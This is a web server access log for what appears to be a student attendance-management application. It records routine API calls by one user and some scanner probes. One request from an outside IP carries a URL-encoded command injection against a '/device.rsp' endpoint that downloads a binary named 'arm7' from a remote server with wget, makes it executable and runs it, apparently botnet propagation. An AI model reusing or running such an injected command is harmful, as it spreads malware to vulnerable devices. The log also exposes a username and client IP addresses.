118.70.191.159 - - [07/May/2025:19:09:42 +0000] "GET / HTTP/1.1" 504 569 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:03:58 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/AttendanceManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:03:59 +0000] "GET /api-nodejs/subjects HTTP/1.1" 200 3432 "http://fams.io.vn/AttendanceManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:03:59 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/AttendanceManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:03:59 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/AttendanceManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:03:59 +0000] "GET /api-nodejs/attendance?userId=&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 380215 "http://fams.io.vn/AttendanceManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:03:59 +0000] "GET /api-nodejs/attendance?userId=&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 380215 "http://fams.io.vn/AttendanceManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:01 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:01 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:01 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 3243 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:01 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 3243 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:01 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 3243 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:01 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 3243 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:01 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 3243 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:02 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 3243 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:27 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 200 513 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:28 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/UserHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:28 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/UserHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:30 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:30 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:30 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:30 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:30 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:30 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:30 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:30 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:43 +0000] "GET /api-nodejs/classes/user/thanhnpst1 HTTP/1.1" 200 780 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:43 +0000] "GET /api-nodejs/attendance?userId=thanhnpst1&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 83293 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:43 +0000] "GET /api-nodejs/classes/user/thanhnpst1 HTTP/1.1" 200 780 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:43 +0000] "GET /api-nodejs/attendance?userId=thanhnpst1&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 83293 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:44 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:44 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:04:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
20.83.27.89 - - [07/May/2025:20:05:06 +0000] "GET /portal/redlion HTTP/1.1" 200 866 "-" "Mozilla/5.0 zgrab/0.x"
118.70.191.159 - - [07/May/2025:20:05:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:06:08 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:06:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
185.16.38.107 - - [07/May/2025:20:07:22 +0000] "GET / HTTP/1.1" 200 866 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
118.70.191.159 - - [07/May/2025:20:07:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:08:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:08:48 +0000] "GET /main.7a1108fdcf0dbe23ecc0.hot-update.json HTTP/1.1" 200 28 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:08:48 +0000] "GET /main.7a1108fdcf0dbe23ecc0.hot-update.js HTTP/1.1" 200 4928 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:08:48 +0000] "GET /main.7a1108fdcf0dbe23ecc0.hot-update.js.map HTTP/1.1" 200 4641 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:03 +0000] "GET /api-nodejs/attendance?userId=thanhnpst1&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 83293 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:03 +0000] "GET /api-nodejs/attendance?userId=thanhnpst1&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 83293 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:04 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:04 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:04 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:04 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:04 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:04 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:04 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:04 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:08 +0000] "GET /api-nodejs/attendance?userId=thanhnpst1&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 83293 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:08 +0000] "GET /api-nodejs/attendance?userId=thanhnpst1&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 83293 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:09 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:09 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:09 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:09 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:09 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:09 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:09 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:09 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:10 +0000] "GET /main.c0cf6336d05d1942ac3f.hot-update.json HTTP/1.1" 200 28 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:10 +0000] "GET /main.c0cf6336d05d1942ac3f.hot-update.js HTTP/1.1" 200 10464 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:29 +0000] "GET /main.f9d031d6eecbcaf8122e.hot-update.json HTTP/1.1" 200 28 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:29 +0000] "GET /main.f9d031d6eecbcaf8122e.hot-update.js HTTP/1.1" 200 10454 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:56 +0000] "GET /main.22241d9bd6d5c99d1bb7.hot-update.json HTTP/1.1" 200 28 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:09:56 +0000] "GET /main.22241d9bd6d5c99d1bb7.hot-update.js HTTP/1.1" 200 10519 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
141.98.11.27 - - [07/May/2025:20:10:06 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F103.149.29.68%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 150 "-" "Mozila/5.0"
118.70.191.159 - - [07/May/2025:20:10:09 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:10:56 +0000] "GET /ws HTTP/1.1" 101 343415 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:09 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:31 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=unread HTTP/1.1" 200 615 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:43 +0000] "GET /api-nodejs/attendance?userId=thanhnpst1&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 83293 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
